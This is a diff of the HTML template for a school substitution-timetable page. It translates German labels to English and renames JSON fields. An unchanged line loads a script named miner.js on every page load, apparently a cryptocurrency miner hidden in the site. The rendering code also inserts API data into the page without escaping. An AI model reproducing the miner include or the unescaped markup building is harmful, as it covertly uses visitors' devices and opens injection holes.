@@ -2,7 +2,7 @@
 <html lang="de">
 
 <head>
-    <title>Vertretungsplan</title>
+    <title>Substitutes</title>
     <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/css/materialize.min.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -15,18 +15,18 @@
 </head>
 
 <body>
-<nav class="teal lighten-2"><a href="/" class="brand-logo center">Vertretungsplan</a></nav>
+<nav class="teal lighten-2"><a href="/" class="brand-logo center">Substitutes</a></nav>
 <div class="container" id="app">
     <div class="card-panel grey lighten-3">
         <h4>Substitutes</h4>
         <p class="flow-text" id="title"></p>
         <table class="responsive-table">
             <thead>
-            <th>Stunde</th>
-            <th>Lehrer</th>
-            <th>Fach</th>
-            <th>Raum</th>
-            <th>Art</th>
+            <th>Hour</th>
+            <th>Teacher</th>
+            <th>Subject</th>
+            <th>Room</th>
+            <th>Type</th>
             </thead>
             <tbody class="flow-text"></tbody>
         </table>
@@ -47,20 +47,20 @@
 <script src="/a/miner.js"></script>
 <script>
     $(() => {
-        $.getJSON("/api/{{ .class }}", data => {
+        $.getJSON("/api/c/{{ .class }}", data => {
             $.each(data.substitutes, (a, b) => {
-                (b.Type === "Cancelled") ? $("tbody").append(
+                (b.type === "Cancelled") ? $("tbody").append(
                         "<tr class='teal-text text-lighten-2'><td>" +
-                        b.Hour + "</td><td>" + b.Teacher +
-                        "</td><td>" + b.Subject + "</td><td>" + b.Room + "</td><td>" + b.Type +
+                        b.hour + "</td><td>" + b.teacher +
+                        "</td><td>" + b.subject + "</td><td>" + b.room + "</td><td>" + b.type.replace("Vertretung", "Substitute") +
                         "</td></tr>") : $("tbody").append(
-                        "<tr><td>" + b.Hour + "</td><td>" +
-                        b.Teacher +
-                        "</td><td>" + b.Subject + "</td><td>" + b.Room + "</td><td>" + b.Type +
+                        "<tr><td>" + b.hour + "</td><td>" +
+                        b.teacher +
+                        "</td><td>" + b.subject + "</td><td>" + b.room + "</td><td>" + b.type.replace("Vertretung", "Substitute") +
                         "</td></tr>");
             });
-            $("h4").html(data.meta.Date.replace("Vertretungen", "Substitutes").split("/")[0]);
-            $("#title").html(data.meta.Class);
+            $("h4").html(data.meta.date.replace("Vertretungen", "Substitutes").split("/")[0]);
+            $("#title").html(data.meta.class);
         }).catch(m => Materialize.toast(m.status + ": " + m.responseJSON.message));
     });
 </script>
